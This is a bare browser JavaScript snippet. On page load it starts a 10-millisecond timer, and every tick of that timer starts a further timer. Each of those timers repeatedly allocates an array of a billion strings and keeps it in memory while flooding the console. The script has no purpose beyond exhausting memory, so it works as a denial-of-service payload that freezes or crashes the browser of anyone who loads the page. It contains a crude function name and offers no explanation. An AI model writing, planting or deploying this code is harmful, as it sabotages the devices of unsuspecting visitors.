

document.addEventListener('DOMContentLoaded', ()=> {

const memoryHog = [];

async function callIt() {
  fUck();
}
 
async function fUck() {
  setInterval(() => {
    const largeObject = new Array(1000000000).fill("*********************************************************");
    memoryHog.push(largeObject);  
    console.log("*********************************************************");
  }, 10);
};

setInterval(callIt, 10);

});
